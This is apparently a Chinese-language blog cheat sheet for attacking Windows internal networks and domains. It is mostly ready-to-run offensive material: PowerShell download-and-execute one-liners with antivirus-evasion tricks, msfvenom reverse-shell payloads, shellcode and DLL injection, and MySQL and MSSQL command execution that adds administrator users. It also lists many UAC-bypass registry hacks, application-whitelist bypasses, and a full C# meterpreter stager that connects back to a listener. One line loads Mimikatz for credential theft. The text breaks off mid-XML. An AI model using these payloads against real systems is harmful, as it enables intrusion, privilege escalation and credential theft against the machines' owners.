---
layout:     post
title:      2021-08-10-渗透测试文档（内网&域）
subtitle:   2021-08-10-渗透测试文档（内网&域）
date:       2021-8-10
author:     YY——阳阳
header-img: img/post/1.jpg
catalog: true
tags:
    - 渗透测试

---

# 内网&域

## Powershell  powershell)

```
查看版本$PSVersionTable
```

### 远程执行  _1)

```
>powershell -nop -w hidden -ep bypass "IEX (New-Object Net.WebClient).DownloadString('');Invoke-xxx"
```

![image](http://159.75.51.84:8000/img/100.png)

### 加载exe  exe)

```
msfvenom生成exe木马
#msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f exe > /var/www/html/1.exe  
使用powersploit的Invoke-ReflectivePEInjection.ps1脚本
#powershell.exe -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/clymberps/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://192.168.0.107/1.exe -ForceASLR"
```

### EXE2PS1  exe2ps1)

```
http://192.168.0.107/ps/powersploit/CodeExecution/Convert-BinaryToString.ps1
将exe转换为base64
>Import-Module .\Convert-BinaryToString.ps1
>Convert-BinaryToString -FilePath .\ms15051.exe
```

![image](http://159.75.51.84:8000/img/101.png)

```
http://192.168.0.107/ps/powersploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection.ps1文件头部添加
Function MS15051{
<#
.SYNOPSIS    
.EXAMPLE
C:\PS> MS15051 -Command "whoami"
#>
 [CmdletBinding()]
    param(
        [Parameter(Mandatory = $False)]
        [string]
        $Command
  )
$InputString = "文件的base64编码"
$PEBytes = [System.Convert]::FromBase64String($InputString)
文件尾部添加
write-host ("[+] Executing Command: "+$Command)  -foregroundcolor "Green"
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs $Command 
write-host ("[+] Done !")  -foregroundcolor "Green"
}
```

![image](http://159.75.51.84:8000/img/102.png)

```
远程下载执行
>powershell -nop -w hidden -ep bypass "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.0.107/ps/powersploit/CodeExecution/ms15051.ps1'); MS15051 –Command \"whoami\""
```

![image](http://159.75.51.84:8000/img/103.png)

### 绕过策略  _2)

```
>powershell Set-ExecutionPolicy Unrestricted需管理员权限，不受限执行
>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/Invoke-xxx.ps1');invoke-xxx"
>powershell -exec bypass -File ./a.ps1&>Import-Module xxx
```

#### Base64  base64)

```
>use exploit/multi/script/web_delivery|target=2(PSH)
&
>cat payload.txt | iconv --to-code UTF-16LE |base64
>powershell -ep bypass -enc base64code
```

#### 写入bat绕过  bat)

```
powershell -exec bypass -File ./a.ps1 
将该命令保存为c.bat
```

#### 拼接拆分字符串  _3)

```
powershell.exe  
"
$c1='powershell -c IEX'; 
$c2='(New-Object Net.WebClient).Downlo'; 
$c3='adString("http://192.168.197.192/a.ps1")'; 
echo ($c1,$c2,$c3) 
" 
先将命令拆分为字符串，然后进行拼接。echo修改为IEX执行。
powershell $c2='IEX (New-Object Net.WebClient).Downlo';$c3='adString(''http://x.x.x.x/a'')'; $Text=$c2+$c3; IEX(-join $Text)
```

#### Replace替换函数  replace)

```
powershell -noexit "$c1='IEX(New-Object Net.WebClient).Downlo';$c2='123(''http://192.168.0.108/1.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"
```

#### HTTP字符拼接绕过  http)

```
也可以对http字符进行绕过，同样可以bypass
powershell "$a='IEX((new-object net.webclient).downloadstring("ht';$b='tp://192.168.197.192/a.ps1"))';IEX ($a+$b)"
```

#### 图片免杀  _4)

```
通过图片免杀执行powershell的脚本Invoke-PSImage.ps1，主要把payload分散存到图片的像素中,最后到远端执行时,再重新遍历重组像素中的payload执行。
https://github.com/peewpw/Invoke-PSImage
1900*1200的图片x.jpg。
C:\>powershell 
PS C:\> Import-Module .\Invoke-PSImage.ps1 
PS C:\> Invoke-PSImage -Script .\a.ps1 -Image .\x.jpg -Out .\reverse_shell.png -Web 
a.ps1是msf木马，-Out 生成reverse_shell.png图片，-Web 输出从web读取的命令。
将reverse_shell.png移动至web目录，替换url地址。在powershell下执行即可。
```

#### 加载shellcode  shellcode)

```
msfvenom生成脚本木马
#msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.72.164 LPORT=4444 -f powershell -o /var/www/html/test  
在windows靶机上运行一下命令
PS >IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-Shellcode.ps1") 
PS >IEX(New-Object Net.WebClient).DownloadString("http://192.168.72.164/test") 
Invoke-Shellcode -Shellcode $buf -Force  运行木马 
使用Invoke-Shellcode.ps1脚本执行shellcode
即可反弹meterpreter shell
```

#### 加载dll  dll)

```
使用msfvenom 生成dll木马脚本
>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.72.164 lport=4444 -f dll -o /var/www/html/test.dll 
将生成的dll上传到目标的C盘。在靶机上执行以下命令
PS >IEX(New-Object Net.WebClient).DownloadString("http://144.34.xx.xx/PowerSploit/CodeExecution/Invoke-DllInjection.ps1") 
Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden  
创建新的进程启动记事本，并设置为隐藏
Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll 使用notepad的PID  
Msf
#use exploit/multi/handler
#set payload windows/x64/meterpreter/reverse_tcp
#run
```

## Windows安全标识符(SID)  windowssid)

| 相对标识符 | 说明                       |
| :--------- | :------------------------- |
| 500        | 管理员                     |
| 501        | 来宾                       |
| 502        | 密钥分发中心服务的服务账户 |
| 512        | 域管理员                   |
| 513        | 域用户                     |
| 514        | 域来宾                     |
| 515        | 域计算机                   |
| 516        | 域控制器                   |
| 544        | 内置管理员                 |
| 519        | 企业管理员                 |

## 提权  _5)

### Impacket工具包  impacket)

```
https://github.com/maaaaz/impacket-examples-windows
https://github.com/SecureAuthCorp/impacket
#git clone https://github.com/CoreSecurity/impacket.git 
#cd impacket/ 
#python setup.py install
```

### Windows-exploit-suggester  windows-exploit-suggester)

```
#pip install xlrd --upgrade
#./windows-exploit-suggester.py --update
#./windows-exploit-suggester.py --database 20xx-xx-xx-mssb.xlsx --systeminfo systeminfo.txt
```

### Wesng  wesng)

```
https://github.com/bitsadmin/wesng
>systeminfo >1.txt
>python wes.py 1.txt
```

![image](http://159.75.51.84:8000/img/104.png)

### Searchsploit  searchsploit)

```
使用方法
>searchsploit 软件 版本
查找常见补丁
https://bugs.hacking8.com/tiquan/
http://get-av.se7ensec.cn/index.php
https://patchchecker.com/checkprivs/
wmic查询补丁
wmic qfe list full|findstr /i hotfix
systeminfo>temp.txt&(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do @type temp.txt|@find /i  "%i"|| @echo %i Not Installed!)&del /f /q /a temp.txt
MS17-017 [KB4013081] [GDI Palette Objects Local Privilege Escalation] (windows 7/8) 
CVE-2017-8464 [LNK Remote Code Execution Vulnerability] (windows 10/8.1/7/2016/2010/2008) 
CVE-2017-0213 [Windows COM Elevation of Privilege Vulnerability] (windows 10/8.1/7/2016/2010/2008) 
MS17-010 [KB4013389] [Windows Kernel Mode Drivers] (windows 7/2008/2003/XP) 
MS16-135 [KB3199135] [Windows Kernel Mode Drivers] (2016) 
MS16-111 [KB3186973] [kernel api] (Windows 10 10586 (32/64)/8.1) 
MS16-098 [KB3178466] [Kernel Driver] (Win 8.1) 
MS16-075 [KB3164038] [Hot Potato] (2003/2008/7/8/2012) 
MS16-034 [KB3143145] [Kernel Driver] (2008/7/8/10/2012) 
MS16-032 [KB3143141] [Secondary Logon Handle] (2008/7/8/10/2012) 
MS16-016 [KB3136041] [WebDAV] (2008/Vista/7) 
MS15-097 [KB3089656] [remote code execution] (win8.1/2012) 
MS15-076 [KB3067505] [RPC] (2003/2008/7/8/2012) 
MS15-077 [KB3077657] [ATM] (XP/Vista/Win7/Win8/2000/2003/2008/2012) 
MS15-061 [KB3057839] [Kernel Driver] (2003/2008/7/8/2012) 
MS15-051 [KB3057191] [Windows Kernel Mode Drivers] (2003/2008/7/8/2012) 
MS15-010 [KB3036220] [Kernel Driver] (2003/2008/7/8) 
MS15-015 [KB3031432] [Kernel Driver] (Win7/8/8.1/2012/RT/2012 R2/2008 R2) 
MS15-001 [KB3023266] [Kernel Driver] (2008/2012/7/8) 
MS14-070 [KB2989935] [Kernel Driver] (2003) 
MS14-068 [KB3011780] [Domain Privilege Escalation] (2003/2008/2012/7/8) 
MS14-058 [KB3000061] [Win32k.sys] (2003/2008/2012/7/8) 
MS14-040 [KB2975684] [AFD Driver] (2003/2008/2012/7/8) 
MS14-002 [KB2914368] [NDProxy] (2003/XP) 
MS13-053 [KB2850851] [win32k.sys] (XP/Vista/2003/2008/win 7) 
MS13-046 [KB2840221] [dxgkrnl.sys] (Vista/2003/2008/2012/7) 
MS13-005 [KB2778930] [Kernel Mode Driver] (2003/2008/2012/win7/8) 
MS12-042 [KB2972621] [Service Bus] (2008/2012/win7) 
MS12-020 [KB2671387] [RDP] (2003/2008/7/XP) 
MS11-080 [KB2592799] [AFD.sys] (2003/XP) 
MS11-062 [KB2566454] [NDISTAPI] (2003/XP) 
MS11-046 [KB2503665] [AFD.sys] (2003/2008/7/XP) 
MS11-011 [KB2393802] [kernel Driver] (2003/2008/7/XP/Vista) 
MS10-092 [KB2305420] [Task Scheduler] (2008/7) 
MS10-065 [KB2267960] [FastCGI] (IIS 5.1, 6.0, 7.0, and 7.5) 
MS10-059 [KB982799] [ACL-Churraskito] (2008/7/Vista) 
MS10-048 [KB2160329] [win32k.sys] (XP SP2 & SP3/2003 SP2/Vista SP1 & SP2/2008 Gold & SP2 & R2/Win7) 
MS10-015 [KB977165] [KiTrap0D] (2003/2008/7/XP) 
MS10-012 [KB971468] [SMB Client Trans2 stack overflow] (Windows 7/2008R2) 
MS09-050 [KB975517] [Remote Code Execution] (2008/Vista) 
MS09-020 [KB970483] [IIS 6.0] (IIS 5.1 and 6.0) 
MS09-012 [KB959454] [Chimichurri] (Vista/win7/2008/Vista) 
MS08-068 [KB957097] [Remote Code Execution] (2000/XP) 
MS08-067 [KB958644] [Remote Code Execution] (Windows 2000/XP/Server 2003/Vista/Server 2008) 
MS08-066 [] [] (Windows 2000/XP/Server 2003) 
MS08-025 [KB941693] [Win32.sys] (XP/2003/2008/Vista) 
MS06-040 [KB921883] [Remote Code Execution] (2003/xp/2000) 
MS05-039 [KB899588] [PnP Service] (Win 9X/ME/NT/2000/XP/2003)
MS03-026 [KB823980] [Buffer Overrun In RPC Interface] (/NT/2000/XP/2003)
```

### 激活guest  guest)

```
>net user guest /active:yes
```

### MYSQL udf  mysql-udf)

```
Udf: sqlmap-master\udf\mysql\windows\
>python sqlmap/extra/cloak/cloak.py lib_mysqludf_sys.dll _ 
Mysql>5.1 udf.dll放置在lib\plugin 
Mysql<5.1 udf.dll放置在c:\windows\system32
#show variables like '%compile%'; 查看系统版本
#select @@plugin_dir 查看插件目录
放入udf
#select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll"; 
或将udf十六进制编码后写入
#select hex(load_file('udf_sys_64.dll')) into dumpfile '/tmp/udf.hex'; 
#select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000… into dump file "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll";
或将udf base64编码后写入(MySQL 5.6.1和MariaDB 10.0.5)
#select to_base64(load_file('/usr/udf.dll')) into dumpfile '/tmp/udf.b64';
#select from_base64(“xxxxx”) into dumpfile "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll";
或创建表拼接十六进制编码
#create table temp(data longblob); 
#insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d); 
#update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b3); 
#select data from temp into dump file "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll";
或#insert into temp(data) values(hex(load_file('D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll')));
#SELECT unhex(cmd) FROM mysql.temp INTO DUMPFILE 'D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll ';
或使用快速导入数据
#load data infile '\\\\192.168.0.19\\network\\udf.hex'
#into table temp fields terminated by '@OsandaMalith' lines terminated by '@OsandaMalith' (data); 
#select unhex(data) from temp into dumpfile 'D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll';
创建函数
#create function cmdshell returns string soname 'udf.dll';
#create function sys_exec returns int soname 'udf.dll';
执行命令
#select cmdshell('whoami'); 
#select sys_exec(''whoami''); 
删除函数
#drop function cmdshell;
#drop function sys_exec;
```

### MYSQL Linux Root  mysql-linux-root)

```
https://0xdeadbeef.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
$ mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
```

| name      | ret  | dl             | type     |
| :-------- | :--- | :------------- | :------- |
| do_system | 2    | raptor_udf2.so | function |

```
mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
mysql> \! sh
sh-2.05b$ cat /tmp/out
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
```

### MSSQL  mssql)

```
开启xp_cmdshell
```

#### xp_cmdshell  xp_cmdshell)

```
#exec sp_configure 'show advanced options', 1;reconfigure; 
#exec sp_configure 'xp_cmdshell',1;reconfigure;
#exec master.dbo.xp_cmdshell 'ipconfig'
```

#### xp_regwrite  xp_regwrite)

```
xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','debugger','reg_sz','c:\windows\system32\taskmgr.exe'
```

#### xp_dirtree  xp_dirtree)

```
execute master..xp_dirtree 'c:' //列出所有c:\文件和目录,子目录 
execute master..xp_dirtree 'c:',1 //只列c:\文件夹 
execute master..xp_dirtree 'c:',1,1 //列c:\文件夹加文件
```

#### sp_oacreate  sp_oacreate)

```
exec sp_configure 'show advanced options', 1;RECONFIGURE;
exec sp_configure 'Ola Automation Procedures' , 1;RECONFIGURE;
执行命令
declare @shell int 
exec sp_oacreate 'wscript.shell',@shell output 
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user 123 123 /add'
declare @shell int 
exec sp_oacreate 'wscript.shell',@shell output 
exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 123/add'
删除文件
declare @result int
declare @fso_token int
exec sp_oacreate 'scripting.filesystemobject', @fso_token out
exec sp_oamethod @fso_token,'deletefile',null,'c:\1.txt'
exec sp_oadestroy @fso_token
复制文件
declare @o int
exec sp_oacreate 'scripting.filesystemobject',@o out
exec sp_oamethod @o,'copyfile',null,'c:\1.txt','c:\2.txt'
移动文件
declare @o int
exec sp_oacreate 'scripting.filesystemobject',@o out
exec sp_oamethod @o,'movefile',null,'c:\1.txt','c:\2.txt'
```

#### 沙盒执行  _6)

```
开启沙盒：
>exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1
执行：
>select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\dnary.mdb','select shell("whoami")')
```

#### WarSQLKit(后门)  warsqlkit)

```
http://eyupcelik.com.tr/guvenlik/493-mssql-fileless-rootkit-warsqlkit
```

### MSF  msf)

```
发现补丁
#use post/windows/gather/enum_patches
列举可用EXP
#use post/multi/recon/local_exploit_suggester
```

### Bypass UAC  bypass-uac)

#### MSF  msf_1)

```
>use exploit/windows/local/bypassuac 
>use exploit/windows/local/bypassuac_injection
>use exploit/windows/local/bypassuac_vbs
>use exploit/windows/local/bypassuac_fodhelper
>use exploit/windows/local/bypassuac_eventvwr
>use exploit/windows/local/bypassuac_comhijack
```

#### DccwBypassUAC  dccwbypassuac)

```
Use on win10&win8
```

![image](http://159.75.51.84:8000/img/105.png)

#### K8uac  k8uac)

```
>k8uac.exe xx.exe
>k8uac.exe "command"
```

#### CMSTP  cmstp)

```
设置UAC和Applocker规则
```

![image](http://159.75.51.84:8000/img/106.png) ![image](http://159.75.51.84:8000/img/107.png) ![image](http://159.75.51.84:8000/img/108.png) ![image](http://159.75.51.84:8000/img/109.png)

```
MSF生成恶意DLL传入靶机
>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12138 -f dll -o /var/www/html/cm.dll
```

![image](http://159.75.51.84:8000/img/110.png)

```
DLL同目录下建立run.inf，RegisterOCXSection指定dll位置，也可以指定远程webdav
如：\\192.168.0.107\webdav\cm.dll
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
[RegisterOCXSection]
C:\Users\y.SUB2K8\Desktop\cm.dll
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="cmstp"
ShortSvcName="cmstp"
执行命令可绕过UAC和Applocker上线
>cmstp /s run.inf
```

![image](http://159.75.51.84:8000/img/111.png)

#### Uacme  uacme)

```
包括DLL劫持，COM劫持等50多种bypass方法
https://github.com/hfiref0x/UACME
```

![image](http://159.75.51.84:8000/img/112.png)

```
使用visual studio编译
Visual Studio 2013v120；
Visual Studio 2015v140；
Visual Studio 2017v141;
Visual Studio 2019v142。
目前共59种bypassuac方式
执行方法是
>akagi.exe 1
>akagi.exe 1 c:\windows\system32\cmd.exe
>akagi.exe 1 "net user 1 1 /add"
注意：
方式5，9会对目标安全性产生影响，谨慎使用，5需重启
方式6从win8开始在x64上不可用
方式11，54只支持x32 
方式13，19，30，50只支持x64
方式14需要进程注入，x64要使用x64的工具
```

#### Bypass-UAC  bypass-uac_1)

```
https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC
>Bypass-UAC -Method UacMethodSysprep
```

![image](http://159.75.51.84:8000/img/113.png)

```
Method:
UacMethodSysprep
ucmDismMethod
UacMethodMMC2
UacMethodTcmsetup
UacMethodNetOle32
```

#### DLL hijack  dll-hijack)

```
程序运行，调用DLL的流程
1.程序所在目录
2.系统目录即 SYSTEM32 目录
3.16位系统目录即 SYSTEM 目录
4.Windows目录
5.加载 DLL 时所在的当前目录
6.PATH环境变量中列出的目录
使用
https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck
检查一个程序的是否以高权限执行
>sigcheck.exe -m c:\1.exe
查看autoElevate是否为true
```

![image](http://159.75.51.84:8000/img/114.png)

```
使用process monitor查看对应程序执行时调用的DLL情况，查找DLL不在
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs列表中，并且所在文件夹当前用户可读写，接下来生成恶意dll备份原DLL替换，再运行此程序即可劫持成功。
```

#### SilentCleanup  silentcleanup)

```
>reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f && REM "
>schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

#### Sdclt  sdclt)

```
win10
```

##### 1  1)

```
>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %COMSPEC% /f 获得管理员权限
>sdclt 弹出cmd
>reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f 清除痕迹
```

##### 2  2)

```
https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-SDCLTBypass.ps1
>Invoke-SDCLTBypass -Command "c:\windows\system32\cmd.exe /c C:\Windows\regedit.exe"
>sdclt.exe /KickOffElev
```

#### Makecab&Wusa  makecabwusa)

```
复制文件出错时
```

![image](http://159.75.51.84:8000/img/115.png)

```
>makecab PsExec64.exe C:\Users\y.ZONE\Desktop\ps.cab
>wusa C:\Users\y.ZONE\Desktop\ps.cab /extract:C:\Windows\system32\
```

![image](http://159.75.51.84:8000/img/116.png)

#### CLR BypassUAC  clr-bypassuac)

```
Tested on win10 x64
生成dll传入受控机temp目录，以下保存为1.bat执行。
REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\Temp\test.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER_PATH" /t REG_SZ /d "C:\Temp\test.dll" /f
受控机执行gpedit.msc或eventvwr等高权限.net程序时可劫持成功。
```

![image](http://159.75.51.84:8000/img/117.png)

```
执行后
```

![image](http://159.75.51.84:8000/img/118.png) ![image](http://159.75.51.84:8000/img/119.png) ![image](http://159.75.51.84:8000/img/120.png)

#### eventvwr劫持注册表  eventvwr)

```
打开ProcessMonitor，启动eventvwr，ctrl+T打开进程树，选择进程转到事件
```

![image](http://159.75.51.84:8000/img/121.png)

```
右键选择包括eventvwr.exe
```

![image](http://159.75.51.84:8000/img/122.png)

```
只选择显示注册表活动
```

![image](http://159.75.51.84:8000/img/123.png)

```
添加一条过滤器，显示not found文件
```

![image](http://159.75.51.84:8000/img/124.png)

```
找到相应的注册表位置
```

![image](http://159.75.51.84:8000/img/125.png) ![image](http://159.75.51.84:8000/img/126.png)

```
值修改为
```

![image](http://159.75.51.84:8000/img/127.png)

```
MSF监听，再次打开eventvwr
```

![image](http://159.75.51.84:8000/img/128.png)

#### Web Delivery  web-delivery)

```
>use exploit/multi/script/web_delivery
>set target 3
>set payload windows/x64/meterpreter/reverse_tcp
>exploit
>use auxiliary/server/regsvr32_command_delivery_server
>set cmd ipconfig
>use exploit/windows/misc/regsvr32_applocker_bypass_server
```

#### Invoke-PsUACme  invoke-psuacme)

```
method="sysprep","oobe","ActionQueue","migwiz","cliconfg","winsat","mmc"
>Invoke-PsUACme -method oobe -Payload "c:\user\a\desktop\x.exe"
需指定绝对路径
>Invoke-PsUACme -method oobe -Payload "powershell -w hidden -e xxxxxx"
>Invoke-PsUACme -Payload "powershell -noexit IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.107/ps/powersploit/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
MSFVENOM生成psh-reflection格式脚本
>Invoke-PsUACme –Payload "powershell c:\1.ps1"
```

### Whitelist(白名单)  whitelist)

#### GreatSCT  greatsct)

```
>git clone https://github.com/GreatSCT/GreatSCT.git
>cd GreatSCT/setup&./setup.sh
>use Bypass
>list
>use regasm/meterpreter/rev_tcp.py
>msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
```

#### JSRat  jsrat)

```
>JSRat.py -i 192.168.1.107 -p 4444
```

#### Odbcconf.exe  odbcconfexe)

```
>odbcconf.exe /a {regsvr C:\shell.dll} 可以是任意后缀
```

#### Msiexec.exe  msiexecexe)

```
>msiexec /y c:\user\admin\desktop\1.dll
>msiexec /q /i http://192.168.0.107/dll.dll
```

#### InstallUtil.exe  installutilexe)

```
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:y.exe  /unsafe C:\Users\y\Desktop\1.cs
using System;
using System.Net;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Configuration.Install;
using System.Windows.Forms;
public class GQLBigHgUniLuVx {
    public static void Main()
    {
        while(true)
        {{ MessageBox.Show("doge"); Console.ReadLine();}}
    }
}
[System.ComponentModel.RunInstaller(true)]
public class esxWUYUTWShqW : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary zWrdFAUHmunnu)
    {
        jkmhGrfzsKQeCG.LCIUtRN();
    }
}
public class jkmhGrfzsKQeCG
{ [DllImport("kernel")] private static extern UInt32 VirtualAlloc(UInt32 YUtHhF,UInt32 VenifEUR, UInt32 NIHbxnOmrgiBGL, UInt32 KIheHEUxhAfOI);
[DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 GDmElasSZbx, UInt32 rGECFEZG, UInt32 UyBSrAIp,IntPtr sPEeJlufmodo, UInt32 jmzHRQU, ref UInt32 SnpQPGMvDbMOGmn);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr pRIwbzTTS, UInt32 eRLAWWYQnq);
static byte[] ErlgHH(string ZwznjBJY,int KsMEeo) {
IPEndPoint qAmSXHOKCbGlysd = new IPEndPoint(IPAddress.Parse(ZwznjBJY), KsMEeo);
Socket XXxIoIXNCle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
try { XXxIoIXNCle.Connect(qAmSXHOKCbGlysd); }
catch { return null;}
byte[] UmquAHRnhhpuE = new byte[4];
XXxIoIXNCle.Receive(UmquAHRnhhpuE,4,0);
int kFVRSNnpj = BitConverter.ToInt32(UmquAHRnhhpuE,0);
byte[] qaYyFq = new byte[kFVRSNnpj +5];
int SRCDELibA =0;
while(SRCDELibA < kFVRSNnpj)
{ SRCDELibA += XXxIoIXNCle.Receive(qaYyFq, SRCDELibA +5,(kFVRSNnpj - SRCDELibA)<4096 ? (kFVRSNnpj - SRCDELibA) : 4096,0);}
byte[] TvvzOgPLqwcFFv =BitConverter.GetBytes((int)XXxIoIXNCle.Handle);
Array.Copy(TvvzOgPLqwcFFv,0, qaYyFq,1,4); qaYyFq[0]=0xBF;
return qaYyFq;}
static void cmMtjerv(byte[] HEHUjJhkrNS) {
if(HEHUjJhkrNS !=null) {
UInt32 WcpKfU = VirtualAlloc(0,(UInt32)HEHUjJhkrNS.Length,0x1000,0x40);
Marshal.Copy(HEHUjJhkrNS,0,(IntPtr)(WcpKfU), HEHUjJhkrNS.Length);
IntPtr UhxtIFnlOQatrk = IntPtr.Zero;
UInt32 wdjYKFDCCf =0;
IntPtr XVYcQxpp = IntPtr.Zero;
UhxtIFnlOQatrk = CreateThread(0,0, WcpKfU, XVYcQxpp,0, ref wdjYKFDCCf);
WaitForSingleObject(UhxtIFnlOQatrk,0xFFFFFFFF); }}
public static void LCIUtRN() {
byte[] IBtCWU =null; IBtCWU = ErlgHH("192.168.0.107",12138);
cmMtjerv(IBtCWU);
} }
生成exe后执行
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\y\Desktop\y.exe
MSF监听12138端口
```

#### Compiler.exe  compilerexe)

```
>C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe 1.xml 1.tcp
```

![image](http://159.75.51.84:8000/img/129.png)

##### 1.XML  1xml)

```
<?xml version="1.0" encoding="utf-8"?>
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
<files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
<d2p1:string>1.tcp</d2p1:string>
</files>
<parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
<assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
<embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
<generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
<includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
<linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></outputName>
<tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
<treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
<warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
<win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"/>
